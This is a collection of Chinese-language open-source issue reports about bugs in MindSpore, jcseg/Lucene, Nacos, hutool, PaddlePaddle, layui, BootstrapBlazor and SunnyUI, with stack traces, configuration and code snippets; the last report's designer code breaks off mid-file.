【重庆大学众智】卷积padding出错,": /device ascend : -- MindSpore version :1.3.0 -- Python version :3.7.5 -- OS platform and distribution : -- GCC/Compiler version : 进行卷积时，padding的范围受限而报错 在NPU上，卷积的padding支持大于255的数值   <code>: class TemporalBlock(nn.Cell): def __init__(self, n_inputs, n_outputs, kernel_size, stride, dilation, padding, dropout=0.2): super(TemporalBlock, self).__init__() self.conv1 = nn.Conv1d(n_inputs, n_outputs, kernel_size, stride=stride, pad_mode='pad', padding=padding, dilation=dilation, weight_init='normal') self.chomp1 = Chomp1d(padding) self.relu1 = nn.ReLU() self.dropout1 = nn.Dropout(dropout) self.conv2 = nn.Conv1d(n_outputs, n_outputs, kernel_size, stride=stride, pad_mode='pad', padding=padding, dilation=dilation, weight_init='normal') self.chomp2 = Chomp1d(padding) self.relu2 = nn.ReLU() self.dropout2 = nn.Dropout(dropout) self.net = nn.SequentialCell(self.conv1, self.chomp1, self.relu1, self.conv2, self.chomp2, self.relu2) self.downsample = nn.Conv1d(n_inputs, n_outputs, 1) if n_inputs != n_outputs else None self.relu = nn.ReLU() def construct(self, x): out = self.conv1(x) out = self.chomp1(out) out = self.relu1(out) out = self.conv2(out) out = self.chomp2(out) out = self.relu2(out) res = x if self.downsample is None else self.downsample(x) return self.relu(out + res)"
加入jcseg.properties配置文件后lucene高亮异常,"程序代码： 异常：   <code>: # jcseg properties file. # bug report chenxin &lt;chenxin619315@gmail.com&gt; # Jcseg function #maximum match length. (5-7) jcseg.maxlen = 7 #recognized the chinese name.(1 to open and 0 to close it) jcseg.icnname = 1 #maximum length for pair punctuation text. jcseg.pptmaxlen = 7 #maximum length for chinese last name andron. jcseg.cnmaxlnadron = 1 #Wether to clear the stopwords.(set 1 to clear stopwords and 0 to close it) jcseg.clearstopword = 0 #Wether to convert the chinese numeric to arabic number. (set to 1 open it and 0 to close it) # like '\u4E09\u4E07' to 30000. jcseg.cnnumtoarabic = 1 #Wether to convert the chinese fraction to arabic fraction. #@Note: for lucene,solr,elasticsearch eg.. close it. jcseg.cnfratoarabic = 0 #Wether to keep the unrecognized word. (set 1 to keep unrecognized word and 0 to clear it) jcseg.keepunregword = 1 #Wether to start the secondary segmentation for the complex english words. jcseg.ensencondseg = 1 #min length of the secondary simple token. (better larger than 1) jcseg.stokenminlen = 2 #thrshold for chinese name recognize. # better not change it before you know what you are doing. jcseg.nsthreshold = 1000000 #The punctuations that will be keep in an token.(Not the end of the token). jcseg.keeppunctuations = @#%.&amp;+ ####about the lexicon #abusolte path of the lexicon file. #Multiple path support from jcseg 1.9.2, use ';' to split different path. #example: lexicon.path = /home/chenxin/lex1;/home/chenxin/lex2 (Linux) # : lexicon.path = D:/jcseg/lexicon/1;D:/jcseg/lexicon/2 (WinNT) #lexicon.path=/Code/java/JavaSE/jcseg/lexicon #lexicon.path = {jar.dir}/lexicon ({jar.dir} means the base directory of jcseg-core-{version}.jar) #@since 1.9.9 Jcseg default to load the lexicons in the classpath lexicon.path = null #Wether to load the modified lexicon file auto. lexicon.autoload = 0 #Poll time for auto load. (seconds) lexicon.polltime = 300 ####lexicon load #Wether to load the part of speech of the entry. jcseg.loadpos = 1 #Wether to load the pinyin of the entry. jcseg.loadpinyin = 1 #Wether to load the synoyms words of the entry. jcseg.loadsyn = 1 #wether to load the entity of the entry jcseg.loadentity = 1 // 输出全路径 System.out.println(document.get(""id"")); System.out.println(document.get(""price"")); String title = document.get(""title""); if (title != null) { // 把全部得分高的摘要给显示出来 // 第一个参数是对哪个参数进行设置；第二个是以流的方式读入 TokenStream tokenStream = analyzer.tokenStream(""title"", new StringReader(title)); // 获取最高的片段 System.out.println(highlighter.getBestFragment(tokenStream, title)); } org.apache.lucene.search.highlight.InvalidTokenOffsetsException: Token xie exceeds length of provided text sized 14 at org.apache.lucene.search.highlight.Highlighter.getBestTextFragments(Highlighter.java:225) at org.apache.lucene.search.highlight.Highlighter.getBestFragments(Highlighter.java:155) at org.apache.lucene.search.highlight.Highlighter.getBestFragment(Highlighter.java:101) at com.test.SearchTest.search(SearchTest.java:125) at com.test.SearchTest.main(SearchTest.java:143)"
andIn条件无效？我发现问题所在了，大神粗心了。,"MapperTemplate 类的ExampleValidSqlNode 方法 在添加 list 类型约束条件时，有一个参数错了。 在Eclipse 中打开 471行 将 criterion.noValue 改为 criterion.listValue   <code>: IfSqlNode listValueSqlNode = new IfSqlNode(new MixedSqlNode(listValueContentSqlNodes), ""criterion.noValue"");"
"Input dims is 5, but SliceGradGpuKernel only support 4d or lower.","是在训练yolo3时出现的错误，bug信息如下，烦请解决~   <code>: Traceback (most recent call last): File ""C:/Users/z00617266/Desktop/sedna/examples/ms_incremental_learning/helmet_detection/training/train.py"", line 142, in &lt;module&gt; main() File ""C:/Users/z00617266/Desktop/sedna/examples/ms_incremental_learning/helmet_detection/training/train.py"", line 138, in main return incremental_instance.train(train_data.x, args=args) File ""C:\Users\z00617266\Desktop\sedna\lib\sedna\core\incremental_learning\incremental_learning.py"", line 50, in train train_data=train_data, valid_data=valid_data, **kwargs) File ""C:\Users\z00617266\Desktop\sedna\lib\sedna\backend\mindspore\__init__.py"", line 48, in train **kwargs File ""C:\Users\z00617266\Desktop\sedna\examples\ms_incremental_learning\helmet_detection\training\interface.py"", line 195, in train loss = network(images, batch_y_true_0, batch_y_true_1, batch_y_true_2, batch_gt_box0, batch_gt_box1, batch_gt_box2, input_shape) File ""D:\Python\lib\site-packages\mindspore\nn\cell.py"", line 345, in __call__ out = self.compile_and_run(*inputs) File ""D:\Python\lib\site-packages\mindspore\nn\cell.py"", line 612, in compile_and_run self.compile(*inputs) File ""D:\Python\lib\site-packages\mindspore\nn\cell.py"", line 599, in compile _executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""D:\Python\lib\site-packages\mindspore\common\api.py"", line 494, in compile result = self._executor.compile(obj, args_list, phase, use_vm) RuntimeError: mindspore\ccsrc\backend\session\cpu_session.cc:290 BuildKernel] mindspore\ccsrc\backend\kernel_compiler\cpu\slice_grad_cpu_kernel.cc:232 CheckParam] Input dims is 5, but SliceGradGpuKernel only support 4d or lower. # Trace: In file D:\Python\lib\site-packages\mindspore\ops\_grad\grad_array_ops.py(614)/ dx = input_grad(dout, shape_op(x), begin, end, strides)/ # WARNING: Logging before InitGoogleLogging() is written to STDERR [ERROR] KERNEL(13748,?):2021-8-14 20:41:59 [mindspore\ccsrc\backend\kernel_compiler\cpu\slice_grad_cpu_kernel.cc:232] CheckParam] Input dims is 5, but SliceGradGpuKernel only support 4d or lower. [ERROR] SESSION(13748,?):2021-8-14 20:41:59 [mindspore\ccsrc\backend\session\cpu_session.cc:290] BuildKernel] mindspore\ccsrc\backend\kernel_compiler\cpu\slice_grad_cpu_kernel.cc:232 CheckParam] Input dims is 5, but SliceGradGpuKernel only support 4d or lower. # Trace: In file D:\Python\lib\site-packages\mindspore\ops\_grad\grad_array_ops.py(614)/ dx = input_grad(dout, shape_op(x), begin, end, strides)/ [WARNING] MD(13748,?):2021-8-14 20:42:1 [mindspore\ccsrc\minddata\dataset\util\task.cc:159] Join] BatchOp Thread ID 1204 is not responding. Interrupt again"
点击用户头像-密码修改，报错,版本号：3.4.2 前端版本：vue3版 问题描述： 点击主页右上角头像 -》密码修改 或者 页面&amp;导航 -》 个人页 -》 个人设置 -》 安全设置 -》账户密码 点修改 均报错，不能修改。 截图&amp;代码： 友情提示（为了提高issue处理效率）：   <code>: 但是在 系统管理 -》用户管理 -》（某用户所在行）更多 -》密码 ，可以正常修改密码。
新建了一个子模块 nacos也发布了对应的yml 但服务运行会报错,"报错的日志内容 并且运行之前系统已有的system、auth等服务也会报这个错误   <code>: 17:41:31.500 [main] INFO c.a.n.client.naming - [call,64] - initializer namespace from System Property :null 17:41:31.500 [main] INFO c.a.n.client.naming - [call,73] - initializer namespace from System Environment :null 17:41:31.501 [main] INFO c.a.n.client.naming - [call,83] - initializer namespace from System Property :null 17:41:31.536 [main] ERROR c.a.n.client.naming - [callServer,613] - [NA] failed to request com.alibaba.nacos.api.exception.NacosException: server is DOWN now, please try again later! at com.alibaba.nacos.client.naming.net.NamingProxy.callServer(NamingProxy.java:611) at com.alibaba.nacos.client.naming.net.NamingProxy.reqApi(NamingProxy.java:524) at com.alibaba.nacos.client.naming.net.NamingProxy.reqApi(NamingProxy.java:491) at com.alibaba.nacos.client.naming.net.NamingProxy.reqApi(NamingProxy.java:486) at com.alibaba.nacos.client.naming.net.NamingProxy.queryList(NamingProxy.java:400)"
"[MS][LITE][master] GPU+ml_location_lane_counter*.onnx, inference fail",": Uncomment only one line, hit enter to put that in a new line, and remove leading whitespaces from that line: /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: 测试版本：master，commi_id: bfaf780c9916655b872d06505632b59746a76b88（2021-08-02-10-12-33） 测试用例：ml_location_lane_counter.onnx 和 ml_location_lane_counter0.onnx, 将标杆数据以及ms模型推送到手机，进行推理验证精度 测试结果：预期推理结果精度达标，GPU_FP32/GPU_FP16，三星手机Galaxynote20和Galaxys9推理失败，其余手机OK 08-04 14:27:13.308 16887 16887 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:502] BuildProgram] Program build log: BC-src-code:13:30: error: implicit conversion turns literal floating-point number into integer: 'float' to 'int' [-Werror,-Wliteral-conversion] 08-04 14:27:13.308 16887 16887 E MS_LITE : DTYPE4 res_data = (DTYPE4)(0.0f, 0.0f, 0.0f, 0.0f); 08-04 14:27:13.308 16887 16887 E MS_LITE : ~ ^~~~ 08-04 14:27:13.308 16887 16887 E MS_LITE : BC-src-code:13:36: error: implicit conversion turns literal floating-point number into integer: 'float' to 'int' [-Werror,-Wliteral-conversion] 08-04 14:27:13.308 16887 16887 E MS_LITE : DTYPE4 res_data = (DTYPE4)(0.0f, 0.0f, 0.0f, 0.0f); 08-04 14:27:13.308 16887 16887 E MS_LITE : ~ ^~~~ 08-04 14:27:13.308 16887 16887 E MS_LITE : BC-src-code:13:42: error: implicit conversion turns literal floating-point number into integer: 'float' to 'int' [-Werror,-Wliteral-conversion] 08-04 14:27:13.308 16887 16887 E MS_LITE : DTYPE4 res_data = (DTYPE4)(0.0f, 0.0f, 0.0f, 0.0f); 08-04 14:27:13.308 16887 16887 E MS_LITE : ~ ^~~~ 08-04 14:27:13.308 16887 16887 E MS_LITE : BC-src-code:13:48: error: implicit conversion turns literal floating-point number into integer: 'float' to 'int' [-Werror,-Wliteral-conversion] 08-04 14:27:13.308 16887 16887 E MS_LITE : DTYPE4 res_data = (DTYPE4)(0.0f, 0.0f, 0.0f, 0.0f); 08-04 14:27:13.308 16887 16887 E MS_LITE : 08-04 14:27:13.308 16887 16887 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:504] BuildProgram] Build program failed: Build program failure 08-04 14:27:13.308 16887 16887 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:409] BuildKernel] gather build failed! 08-04 14:27:13.308 16887 16887 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/gather.cc:119] Prepare] Build kernel failed. 08-04 14:27:13.308 16887 16887 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_subgraph.cc:331] Prepare] prepare node Gather_732 failed 08-04 14:27:13.308 16887 16887 E MS_LITE : [mindspore/lite/src/lite_session.cc:598] PrepareKernels] Prepare kernel GpuSubGraph0 failed: -1 08-04 14:27:13.308 16887 16887 E MS_LITE : [mindspore/lite/src/lite_session.cc:510] CompileGraph] Prepare kernels failed: -1 08-04 14:27:13.308 16887 16887 E MS_LITE : [mindspore/lite/src/cxx_api/model/model_impl.cc:126] Build] Build model failed."
组件中自定义模板的疑问,之前其实一直在用vue 等框架，现在换成了blazor，BootstrapBlazor组件是我用过最好的一个，给大佬们点赞，但是遇到一个组件上用的有点和vue组件变扭的地方。 大致就是 不少带内容的组件缺少自定义模板的功能，一般这种组件都会只提供一个str字段或者html字段，用起来有点变扭，之前提了一个table header的，老哥给改了，现在又用到一个下拉框组件： 在vue使用其他组件时一般是可以自定义下拉选项里的 选项模板的，这里不行，因为我想改下选项的样式，比如前面加一些红点什么的，不管是你想嵌套其他组件组合还是啥都可以，比较自由些，这里只能用SelectedItem，所以我又查到了另外一个组件想实现我的需求 但是这个弹窗又只能用html内容也不能用模板，而且触发方式缺一个，就是点击按钮触发打开，二次点击关闭，这里只有移入就触发二次点击关闭，点击打开，点击关闭。 奈何用的时间比较短，没有实力去提pr 无 组件版本 latest 浏览器 all Web Assembly   <code>: Dropdown 下拉菜单 Popover 弹出窗组件
用户编辑界面加载异常,pigx版本: V2.7.0   <code>: 1、用户编辑界面加载时，未加载“所属部门”信息 2、用户编辑界面加载的“手机号”格式有误 略
xxl-job单独部署时会存在两个进程,版本号：v2.4.3   <code>: xxl-job单独部署时会存在两个进程
[ST][MS/modelzoo][NET][esr-ea][Ascend]train fail,"esr-ea 训练失败 / 硬件环境: /device Ascend/ : -- MindSpore version :master commit_id:5231ff8e -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_esr_ea_vid2k_ascend_check_fps_0001 get code from models sh run_standalone_train_cpu.sh 训练成功 走给安正气   <code>: [TRACE] TDT(25828,python3.7):2022-05-09-10:21:54.192.597 [status:Running] [log.cpp:154]Channel ""c6c8fba0-cf3e-11ec-9a14-78b46a368ae4"": Send Sample Files,[tensor_data_deliver.cpp:279:Send]29642 [ERROR] ANALYZER(25828,ffffbe7a3010,python3.7):2022-05-09-10:22:16.375.240 [mindspore/ccsrc/pipeline/jit/static_analysis/async_eval_result.cc:66] HandleException] Exception happened, check the information as below. The function call stack (See file '/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/esr_ea/train/test_ms_esr_ea_vid2k_ascend_check_fps_0001/src/rank_0/om/analyze_fail.dat' for more details): # 0 In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py(375) grads = self.grad(self.network, self.weights)(*inputs, sens) ^ # 1 In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/_grad/grad_array_ops.py(395) if isinstance(out_offset, tuple): ^ 2022-05-09 10:22:16.413 ERROR Traceback (most recent call last): File ""/home/jenkins/.local/lib/python3.7/site-packages/vega/core/scheduler/local_master.py"", line 58, in run worker.train_process() File ""/home/jenkins/.local/lib/python3.7/site-packages/vega/common/wrappers.py"", line 66, in wrapper r = func(self, *args, **kwargs) File ""/home/jenkins/.local/lib/python3.7/site-packages/vega/trainer/trainer_base.py"", line 130, in train_process self._train_loop() File ""/home/jenkins/.local/lib/python3.7/site-packages/vega/trainer/trainer_base.py"", line 266, in _train_loop self._train_epoch() File ""/home/jenkins/.local/lib/python3.7/site-packages/vega/trainer/trainer_ms.py"", line 106, in _train_epoch dataset_sink_mode=self.dataset_sink_mode) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 906, in train sink_size=sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 87, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 548, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 628, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 584, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 962, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 935, in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1081, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_extends/parse/parser.py"", line 414, in python_isinstance return isinstance(x, cmp_type) TypeError: isinstance() arg 2 must be a type or tuple of types 2022-05-09 10:22:16.414 ERROR Failed to run worker, id=1 2022-05-09 10:22:16.426 ERROR Failed to run pipeline. 2022-05-09 10:22:16.427 ERROR Traceback (most recent call last): File ""/home/jenkins/.local/lib/python3.7/site-packages/vega/core/pipeline/pipeline.py"", line 79, in run pipestep.do() File ""/home/jenkins/.local/lib/python3.7/site-packages/vega/core/pipeline/search_pipe_step.py"", line 55, in do self._dispatch_trainer(res) File ""/home/jenkins/.local/lib/python3.7/site-packages/vega/core/pipeline/search_pipe_step.py"", line 73, in _dispatch_trainer self.master.run(trainer, evaluator) File ""/home/jenkins/.local/lib/python3.7/site-packages/vega/core/scheduler/local_master.py"", line 63, in run self._update(step_name, worker_id) File ""/home/jenkins/.local/lib/python3.7/site-packages/vega/core/scheduler/local_master.py"", line 71, in _update self.update_func(step_name, worker_id) File ""/home/jenkins/.local/lib/python3.7/site-packages/vega/core/pipeline/generator.py"", line 129, in update self.search_alg.update(record.serialize()) File ""/home/jenkins/.local/lib/python3.7/site-packages/vega/algorithms/nas/esr_ea/esr_search.py"", line 256, in update performance = float(record.get(""rewards"")) TypeError: float() argument must be a string or a number, not 'NoneType'"
MapUtil.getDate 报No format fit for date String [null] !,"JDK版本： openjdk_8_221 hutool版本： 5.5.9   <code>: // body中 scheduleTime为null 5.5.1版本是可以的 Map body = new HashMap(); body.put(""scheduleTime"",""null""); System.out.println(""====================tttttttttttttttt===============""); System.out.println(body.get(""scheduleTime"")); Date scheduleTime = MapUtil.getDate(body, ""scheduleTime""); System.out.println(""====================tttttttttttttttt==============="");"
Bug in mindspore.ops.operations.BinaryCrossEntropy,": /device gpu /device cpu : -- MindSpore version : r1.1 -- Python version : 3.7.5 -- OS platform and distribution : Linux Ubuntu 18.04 -- GCC/Compiler version : gcc version 7.5.0 Call the function and set the parameter as 'mean' or 'sum' set the input array with only one element, e.g., It returns the a value twice the correct value, i.e., 1.3862944 Return the correct value, i.e., 0.6931472 It happens when the input array has only one element.   <code>: from mindspore.ops import operations as ops ops.BinaryCrossEntropy() reduction input_x=[0.5], input_y=[1], weight=[1]"
Operator conv2d does not have kernel for data_type[uint8_t],"1）windows 10 python3.8 2）paddlepaddle-gpu 2.0 3）CUDA11.0 ; cudnn8.0.4; GPU tesla V100 问题描述：   <code>: RuntimeError: (NotFound) Operator conv2d does not have kernel for data_type[uint8_t]:data_layout[ANY_LAYOUT]:place[CUDAPlace(0)]:library_type[CUDNN]. [Hint: Expected kernel_iter != kernels.end(), but received kernel_iter == kernels.end().] (at D:\v2.0.0\paddle\paddle\fluid\imperative\prepared_operator.cc:127) [operator &lt; conv2d &gt; error]"
layui.use 中如何使用页面参数？,"修改页面是弹窗后，通过view(this.id).render 渲染出来的 其中的参数tr.data中的值如何在 layui.use(function(){ 中进行引用？ 先感谢！！！ ===============step 1 ===============step 2   <code>: //列表页渲染form：for 修改 //数据tr.data:{'id':100, 'code':'aaaabbbb'} //tr view(this.id).render('company/form', tr.data).done(function(){ form.render(null, 'LAY-FORM-company2'); }); &lt;script&gt; layui.use(['laydate','admin'], function(){ var $ = layui.$ ,setter = layui.setter ,layer = layui.layer ,admin = layui.admin ,form = layui.form; //使用页面参数code //这里怎么引用？ console.log('code=', code); }); &lt;/script&gt;"
[CT][MS][doc]  Div、Minimum examples error,": Ascend GPU CPU /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : mindspore.ops.operations.math_ops.Div mindspore.ops.operations.math_ops.Minimum 进入master分支 执行Examples样例 mindspore.ops.operations.math_ops.Div Examples passed   <code>: File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/operations/math_ops.py"", line 2531, in mindspore.ops.operations.math_ops.Div Failed example: print(output.dtype) Expected: Flaot32 Got: Float32"
继承UIPage，UIDataGridView无法隐藏行单元格按钮,"SunnyUI 版本号 V3.2.2 SunnyUI 引用来源 Nuget Gitee Github 其他 操作系统 Win7 Win10 Win11 WindowsXP 其他 .Net运行环境版本 .Net Framework4.0 .Net Framework4.5 .Net Framework4.7.2 .Net6 其他 发生了什么问题？ HomeForm继承UIPage，显示UIDataGridView，根据行数据判断是否显示操作列按钮，写了代码发现无法隐藏行单元格按钮。 突然想到HomeForm改回继承Form，可以正常隐藏行单元格按钮。 问题贴图 请贴出发生问题时候的截图： 问题代码 请贴出发生问题时候的代码： 继承改成Form HomeForm继承UIPage，可以正常隐藏行单元格按钮   <code>: partial class Form2 { /// &lt;summary&gt; /// 必需的设计器变量。 /// &lt;/summary&gt; private System.ComponentModel.IContainer components = null; /// &lt;summary&gt; /// 清理所有正在使用的资源。 /// &lt;/summary&gt; /// &lt;param name=""disposing""&gt;如果应释放托管资源，为 true；否则为 false。&lt;/param&gt; protected override void Dispose(bool disposing) { if (disposing &amp;&amp; (components != null)) { components.Dispose(); } base.Dispose(disposing); } #region Windows 窗体设计器生成的代码 /// &lt;summary&gt; /// 设计器支持所需的方法 - 不要 /// 使用代码编辑器修改此方法的内容。 /// &lt;/summary&gt; private void InitializeComponent() { System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle(); System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle(); System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle(); System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle(); System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle(); System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle(); System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle(); this.dgvUser = new System.Windows.Forms.DataGridView(); this.UserName = new System.Windows.Forms.DataGridViewTextBoxColumn(); this.UserStatus = new DataGridView添加禁用Button列.DataGridViewDisableButtonColumn(); this.UserType = new System.Windows.Forms.DataGridViewTextBoxColumn(); this.dataGridViewDisableButtonColumn1 = new DataGridView添加禁用Button列.DataGridViewDisableButtonColumn(); this.uiDataGridView1 = new Sunny.UI.UIDataGridView(); this.UserName1 = new System.Windows.Forms.DataGridViewTextBoxColumn(); this.UserStatus1 = new DataGridView添加禁用Button列.DataGridViewDisableButtonColumn(); this.UserType1 = new System.Windows.Forms.DataGridViewTextBoxColumn(); ((System.ComponentModel.ISupportInitialize)(this.dgvUser)).BeginInit(); ((System.ComponentModel.ISupportInitialize)(this.uiDataGridView1)).BeginInit(); this.SuspendLayout(); // // dgvUser // this.dgvUser.AllowUserToAddRows = false; this.dgvUser.AllowUserToDeleteRows = false; dataGridViewCellStyle1.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter; dataGridViewCellStyle1.BackColor = System.Drawing.SystemColors.Control; dataGridViewCellStyle1.Font = new System.Drawing.Font(""微软雅黑"", 12F); dataGridViewCellStyle1.ForeColor = System.Drawing.SystemColors.WindowText; dataGridViewCellStyle1.SelectionBackColor = System.Drawing.SystemColors.Highlight; dataGridViewCellStyle1.SelectionForeColor = System.Drawing.SystemColors.HighlightText; dataGridViewCellStyle1.WrapMode = System.Windows.Forms.DataGridViewTriState.True; this.dgvUser.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle1; this.dgvUser.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize; this.dgvUser.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] { this.UserName, this.UserStatus, this.UserType}); this.dgvUser.Dock = System.Windows.Forms.DockStyle.Top; this.dgvUser.Location = new System.Drawing.Point(0, 0); this.dgvUser.Margin = new System.Windows.Forms.Padding(4); this.dgvUser.Name = ""dgvUser""; dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter; dataGridViewCellStyle2.BackColor = System.Drawing.SystemColors.Control; dataGridViewCellStyle2.Font = new System.Drawing.Font(""微软雅黑"", 12F); dataGridViewCellStyle2.ForeColor = System.Drawing.SystemColors.WindowText; dataGridViewCellStyle2.SelectionBackColor = System.Drawing.SystemColors.Highlight; dataGridViewCellStyle2.SelectionForeColor = System.Drawing.SystemColors.HighlightText; dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True; this.dgvUser.RowHeadersDefaultCellStyle = dataGridViewCellStyle2; this.dgvUser.RowHeadersVisible = false; this.dgvUser.RowHeadersWidth = 51; this.dgvUser.RowTemplate.Height = 23; this.dgvUser.Size = new System.Drawing.Size(795, 144); this.dgvUser.TabIndex = 1; this.dgvUser.CellClick += new System.Windows.Forms.DataGridViewCellEventHandler(this.dgvUser_CellClick); // // UserName // this.UserName.DataPropertyName = ""UserName""; this.UserName.HeaderText = ""UserName""; this.UserName.MinimumWidth = 6; this.UserName.Name = ""UserName""; this.UserName.Width = 125; // // UserStatus // this.UserStatus.DataPropertyName = ""UserStatus""; this.UserStatus.HeaderText = ""设置""; this.UserStatus.MinimumWidth = 6; this.UserStatus.Name = ""UserStatus""; this.UserStatus.Text = ""设置""; this.UserStatus.ToolTipText = ""设置""; this.UserStatus.UseColumnTextForButtonValue = true; this.UserStatus.Width = 125; // // UserType // this.UserType.DataPropertyName = ""UserType""; this.UserType.HeaderText = ""UserType""; this.UserType.MinimumWidth = 6; this.UserType.Name = ""UserType""; this.UserType.Width = 125; // // dataGridViewDisableButtonColumn1 // this.dataGridViewDisableButtonColumn1.DataPropertyName = ""UserStatus""; this.dataGridViewDisableButtonColumn1.HeaderText = ""设置""; this.dataGridViewDisableButtonColumn1.MinimumWidth = 6; this.dataGridViewDisableButtonColumn1.Name = ""dataGridViewDisableButtonColumn1""; this.dataGridViewDisableButtonColumn1.Text = ""设置""; this.dataGridViewDisableButtonColumn1.ToolTipText = ""设置""; this.dataGridViewDisableButtonColumn1.UseColumnTextForButtonValue = true; this.dataGridViewDisableButtonColumn1.Width = 125; // // uiDataGridView1 // this.uiDataGridView1.AllowUserToAddRows = false; dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(249)))), ((int)(((byte)(255))))); this.uiDataGridView1.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle3; this.uiDataGridView1.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(249)))), ((int)(((byte)(255))))); this.uiDataGridView1.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single; dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter; dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(160)))), ((int)(((byte)(255))))); dataGridViewCellStyle4.Font = new System.Drawing.Font(""微软雅黑"", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134))); dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White; dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(160)))), ((int)(((byte)(255))))); dataGridViewCellStyle4.SelectionForeColor = System.Drawing.SystemColors.HighlightText; dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True; this.uiDataGridView1.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle4; this.uiDataGridView1.ColumnHeadersHeight = 32; this.uiDataGridView1.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing; this.uiDataGridView1.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] { this.UserName1, this.UserStatus1, this.UserType1}); dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft; dataGridViewCellStyle5.BackColor = System.Drawing.Color.White; dataGridViewCellStyle5.Font = new System.Drawing.Font(""微软雅黑"", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134))); dataGridViewCellStyle5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(48)))), ((int)(((byte)(48)))), ((int)(((byte)(48))))); dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(220)))), ((int)(((byte)(236)))), ((int)(((byte)(255))))); dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(48)))), ((int)(((byte)(48)))), ((int)(((byte)(48))))); dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.False; this.uiDataGridView1.DefaultCellStyle = dataGridViewCellStyle5; this.uiDataGridView1.EnableHeadersVisualStyles = false; this.uiDataGridView1.Font = new System.Drawing.Font(""微软雅黑"", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134))); this.uiDataGridView1.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(104)))), ((int)(((byte)(173)))), ((int)(((byte)(255))))); this.uiDataGridView1.Location = new System.Drawing.Point(0, 191); this.uiDataGridView1.Name = ""uiDataGridView1""; dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft; dataGridViewCellStyle6.BackColor = 